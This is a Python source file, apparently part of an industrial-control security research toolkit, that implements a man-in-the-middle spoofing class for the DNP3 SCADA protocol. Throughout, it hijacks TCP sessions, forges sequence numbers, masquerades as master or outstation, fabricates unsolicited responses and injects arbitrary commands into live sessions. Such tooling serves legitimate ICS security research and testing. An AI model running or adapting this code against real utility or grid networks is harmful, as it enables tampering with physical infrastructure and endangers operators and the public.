__author__ = 'Nicholas Rodofile'
from MITM_Lib import Spoof
from DNP3_Lib import *
from DNP3_ObjectClassHandler import *
from DNP3_spoofable_messages import *


class DNP3_Spoof(Spoof):
    def __init__(self, source=None, destination=None, attacker=None, attack_function=None, verbose=1,
                 sequence=None, acknowledgement=None):
        Spoof.__init__(self, source=source, destination=destination, attacker=attacker, attack_function=attack_function,
                       verbose=verbose, sequence=sequence, acknowledgement=acknowledgement)
        self.dnp3_src_sequence = 0
        self.dnp3_spoof_sequence = 0
        self.dnp3_app_sequence = 0
        self.dnp3_head = None
        self.dnp3_transport = DNP3Transport(FIN=SET, FIR=SET)
        self.dnp3_application_response = DNP3ApplicationResponse(FUNC_CODE="RESPONSE",
                                                                 IIN=DNP3ApplicationIIN())
        self.dnp3_application_request = DNP3ApplicationRequest(FUNC_CODE="CONFIRM")
        self.object_handler = DNP3DataObjectHandler()

    def sequence_conf_injection(self, pkt):
        if pkt.haslayer(TCP):
            self.acknowledgement = pkt[TCP].seq
            self.sequence = pkt[TCP].ack
            self.window_size = pkt[TCP].window
            for opt in pkt.getlayer(TCP).options:
                    if "Timestamp" in opt:
                        self.timestamp_ts = opt[1][0]
                        self.timestamp_ecr = opt[1][1]

    def increment_app_sequence(self):
        if self.dnp3_app_sequence >= 15:
            self.dnp3_app_sequence = 0
        else:
            self.dnp3_app_sequence += 1

    def increment_sequence(self):
        if self.dnp3_spoof_sequence >= 63:
            self.dnp3_spoof_sequence = 0
        else:
            self.dnp3_spoof_sequence += 1

    def show_sequence(self):
        print "Seq: ", self.source.DNP3_sequence, "\tApp:", self.source.DNP3_app_sequence

    def init_dnp3_head(self, pkt):
        if self.destination.DNP3_address != pkt[DNP3].DESTINATION:
            self.destination.DNP3_address = pkt[DNP3].DESTINATION
        if self.source.DNP3_address != pkt[DNP3].SOURCE:
            self.source.DNP3_address = pkt[DNP3].SOURCE
        self.dnp3_head = DNP3(DESTINATION=self.source.DNP3_address, SOURCE=self.destination.DNP3_address)

    def DNP3_responder(self, pkt):
        if self.dnp3_head is None:
            self.init_dnp3_head(pkt)
            dnp3_control = DNP3HeaderControl(DIR=UNSET, PRM=SET)
            self.dnp3_head.CONTROL = dnp3_control
        if pkt.haslayer(DNP3Transport):
            self.increment_sequence()
            self.dnp3_transport.SEQUENCE = self.dnp3_spoof_sequence
            dnp3 = self.dnp3_head/self.dnp3_transport
            if pkt.haslayer(DNP3ApplicationRequest):
                dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=UNSET, UNS=UNSET,
                                                               SEQ=pkt[DNP3ApplicationRequest].Application_control.SEQ)
                self.dnp3_application_response.Application_control = dnp3_application_ctrl
                dnp3 = dnp3/self.dnp3_application_response
                rsp_msg = process_response_message(pkt)
                if rsp_msg is not None:
                    dnp3 = dnp3/rsp_msg
            return dnp3
        else:
            return response_link_status(self.dnp3_head)

    def DNP3_request(self, pkt):
        if self.dnp3_head is None:
            self.init_dnp3_head(pkt)
        dnp3_control = DNP3HeaderControl(DIR=SET, PRM=SET)
        self.dnp3_head.CONTROL = dnp3_control
        self.increment_sequence()
        if pkt.haslayer(DNP3Transport):
            dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=UNSET, UNS=SET,
                                                           SEQ=pkt[DNP3ApplicationResponse].Application_control.SEQ)
            self.dnp3_transport.SEQUENCE = self.dnp3_spoof_sequence
            self.dnp3_application_request.Application_control = dnp3_application_ctrl
            self.dnp3_application_request.FUNC_CODE = 0 #Confirm
            dnp3 = self.dnp3_head/self.dnp3_transport/self.dnp3_application_request
            return dnp3
        else:
            return response_link_status(self.dnp3_head)

    def forward(self, pkt):
        if pkt.haslayer(DNP3Transport):
            pkt[DNP3Transport].SEQUENCE = self.dnp3_spoof_sequence + 1
            super(DNP3_Spoof, self).forward(pkt)

        self.socket.send(pkt)

    def gateway_responder(self, pkt):
        #print "DNP3 Response"
        if self.source is not None or self.attacker is not None:
            if pkt.haslayer(TCP):
                if pkt[TCP].seq < self.sequence:
                    #self.retransmit_push_ack(pkt)
                    pass
                elif pkt[TCP].flags == 24:
                    if self.sequence is None:
                        self.sequence = len(pkt[TCP].payload)
                    else:
                        self.sequence = (len(pkt[TCP].payload) + int(self.sequence))
                    self.push_ack(pkt, msg=self.DNP3_responder(pkt))
                else:
                    pkt.summary()
        else:
            print "No Nodes!\n", self.show_all()

    def ack_gateway(self, pkt):
        TSval, TSecr = self.get_timestamp(pkt)
        tcp = TCP(seq=pkt.ack, ack=self.sequence, sport=self.destination_port,
                  dport=self.source_port, flags='A',
                  window=self.window_size,
                  options=[('Timestamp', (TSval, TSecr))])
        ack = self.ethernet/self.ip/tcp
        #sendp(ack, verbose=0)
        self.socket.send(ack)
        self.sequence_conf_injection(ack)
        if self.verbose:
            print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  " Spoofing to Slave Ack\n"

    def victim_responder(self, pkt):
        if self.source is not None or self.attacker is not None:
            if pkt.haslayer(TCP):
                if pkt[TCP].seq < self.sequence and pkt[TCP].flags == 24:
                    self.retransmit_push_ack(pkt)
                elif pkt[TCP].flags == 24:
                    if pkt.haslayer(DNP3ApplicationResponse):
                        if pkt[DNP3ApplicationResponse].Application_control.CON == SET:
                            self.sequence += len(pkt[TCP].payload)
                            self.ack(pkt)
                            self.push_ack(pkt, msg=self.DNP3_request(pkt))
                        else:
                            self.sequence += len(pkt[TCP].payload)
                            self.ack_gateway(pkt)
                    else:
                        pkt.summary()
                else:
                    pkt.summary()
        else:
            print "No Nodes!\n", self.show_all()

    def address_config(self, pkt):
        if self.dnp3_head is None:
            self.dnp3_head = DNP3(DESTINATION=None, SOURCE=None)
        if self.destination.DNP3_address != pkt[DNP3].SOURCE:
            self.destination.DNP3_address = pkt[DNP3].SOURCE
            self.dnp3_head.DESTINATION = self.destination.DNP3_address
        if self.source.DNP3_address != pkt[DNP3].DESTINATION:
            self.source.DNP3_address = pkt[DNP3].DESTINATION
            self.dnp3_head.SOURCE = self.source.DNP3_address

    def masquerade(self, msg, pkt=None, unsolicited=UNSET):
        if self.dnp3_head is None:
            self.dnp3_head = DNP3(DESTINATION=self.destination.DNP3_address, SOURCE=self.source.DNP3_address)
        if pkt is not None:
            self.address_config(pkt)     
        dnp3_control = DNP3HeaderControl(DIR=SET, PRM=SET)
        if msg is None: # Send Link Status
            return self.dnp3_head
        app_sequence = 0
        transport_sequence = 0
        if pkt is not None:
            if pkt.haslayer(DNP3ApplicationResponse):
                if pkt[DNP3ApplicationResponse].FUNC_CODE == 0x82:# unsolicited
                    app_sequence = pkt[DNP3ApplicationResponse].Application_control.SEQ
                    #transport_sequence = pkt[DNP3Transport].SEQUENCE
                    transport_sequence = self.dnp3_spoof_sequence
                    self.increment_sequence()
        else:
            app_sequence = self.dnp3_app_sequence
            transport_sequence = self.dnp3_spoof_sequence
            self.increment_sequence()
            self.increment_app_sequence()
        dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=UNSET, UNS=unsolicited,
                                                       SEQ=app_sequence)
        dnp3_msg = create_request(msg)
        dnp3_application_request = self.dnp3_application_request
        self.dnp3_head.CONTROL = dnp3_control
        self.dnp3_transport.SEQUENCE = transport_sequence
        self.dnp3_application_request.Application_control = dnp3_application_ctrl
        if dnp3_msg is not None:
            dnp3_application_request = dnp3_application_request/dnp3_msg
            dnp3_application_request.FUNC_CODE = int(msg[0])
        elif (msg[1] is None) and (dnp3_msg is None):
            dnp3_application_request.FUNC_CODE = int(msg[0])
        elif (msg[1] is not None) and (dnp3_msg is None):
            dnp3_application_request.FUNC_CODE = int(msg[0])
        dnp3 = self.dnp3_head/self.dnp3_transport/dnp3_application_request
        return dnp3

    def get_unsolicited_response(self, obj_class, index, confirm=SET):
        if self.dnp3_head is None:
            self.dnp3_head = DNP3(DESTINATION=self.destination.DNP3_address, SOURCE=self.source.DNP3_address)

        dnp3_control = DNP3HeaderControl(DIR=UNSET, PRM=SET)
        app_sequence = self.dnp3_app_sequence
        transport_sequence = self.dnp3_spoof_sequence
        self.increment_sequence()
        self.increment_app_sequence()
        dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=confirm, UNS=SET,
                                                       SEQ=app_sequence)
        dnp3_msg = self.object_handler.read_data_object(obj_class, index)
        dnp3_application_response = self.dnp3_application_response
        self.dnp3_head.CONTROL = dnp3_control
        self.dnp3_transport.SEQUENCE = transport_sequence
        self.dnp3_application_response.Application_control = dnp3_application_ctrl
        if dnp3_msg is not None:
            dnp3_application_response = dnp3_application_response/dnp3_msg
        dnp3_application_response.FUNC_CODE = "UNSOLICITED_RESPONSE"
        dnp3 = self.dnp3_head/self.dnp3_transport/dnp3_application_response
        return dnp3

    def masquerade_slave(self, pkt=None, unsolicited=UNSET, confirm=UNSET):
        if self.dnp3_head is None:
            self.dnp3_head = DNP3(DESTINATION=self.destination.DNP3_address, SOURCE=self.source.DNP3_address)
        if pkt is not None:
            self.address_config(pkt)

        dnp3_control = DNP3HeaderControl(DIR=UNSET, PRM=SET)
        app_sequence = 0
        transport_sequence = 0
        if pkt is not None:
            if pkt.haslayer(DNP3ApplicationRequest):
                app_sequence = pkt[DNP3ApplicationRequest].Application_control.SEQ
                transport_sequence = self.dnp3_spoof_sequence
                self.increment_sequence()
        else:
            app_sequence = self.dnp3_app_sequence
            transport_sequence = self.dnp3_spoof_sequence
            self.increment_sequence()
            self.increment_app_sequence()
        dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=confirm, UNS=unsolicited,
                                                       SEQ=app_sequence)
        dnp3_msg = self.object_handler.read_changed_data(pkt)
        dnp3_application_response = self.dnp3_application_response
        self.dnp3_head.CONTROL = dnp3_control
        self.dnp3_transport.SEQUENCE = transport_sequence
        self.dnp3_application_response.Application_control = dnp3_application_ctrl
        if dnp3_msg:
            dnp3_application_response = dnp3_application_response/dnp3_msg
            self.dnp3_application_response.Application_control.CON = SET
            if unsolicited:
                dnp3_application_response.FUNC_CODE = "UNSOLICITED_RESPONSE"
            else:
                dnp3_application_response.FUNC_CODE = "RESPONSE"
        dnp3 = self.dnp3_head/self.dnp3_transport/dnp3_application_response
        return dnp3

    def init_inject_head(self):
        if self.dnp3_head is None:
            self.dnp3_head = DNP3(DESTINATION=self.destination.DNP3_address, SOURCE=self.source.DNP3_address)
        dnp3_control = DNP3HeaderControl(DIR=SET, PRM=SET)
        self.increment_sequence()
        self.increment_app_sequence()
        dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=SET, CON=UNSET, UNS=UNSET,
                                                       SEQ=self.dnp3_app_sequence)
        return dnp3_control, dnp3_application_ctrl

    def inject(self, msg):
        dnp3_control, dnp3_application_ctrl = self.init_inject_head()
        dnp3_msg = create_request_message(msg)
        dnp3_application_request = self.dnp3_application_request
        self.dnp3_head.CONTROL = dnp3_control
        self.dnp3_transport.SEQUENCE = self.dnp3_spoof_sequence
        self.dnp3_application_request.Application_control = dnp3_application_ctrl
        if dnp3_msg is not None:
            dnp3_application_request = dnp3_application_request/dnp3_msg
            dnp3_application_request.FUNC_CODE = int(msg)
        dnp3 = self.dnp3_head/self.dnp3_transport/dnp3_application_request
        super(DNP3_Spoof, self).inject(dnp3)


    def inject_automation(self, msg):
        dnp3_control, dnp3_application_ctrl = self.init_inject_head()
        dnp3_msg = create_request(msg)
        dnp3_application_request = self.dnp3_application_request
        self.dnp3_head.CONTROL = dnp3_control
        self.dnp3_transport.SEQUENCE = self.dnp3_spoof_sequence
        self.dnp3_application_request.Application_control = dnp3_application_ctrl
        if dnp3_msg is not None:
            print dnp3_msg.summary()
            dnp3_application_request = dnp3_application_request/dnp3_msg
            dnp3_application_request.FUNC_CODE = msg[0]
        dnp3 = self.dnp3_head/self.dnp3_transport/dnp3_application_request
        super(DNP3_Spoof, self).inject(dnp3)
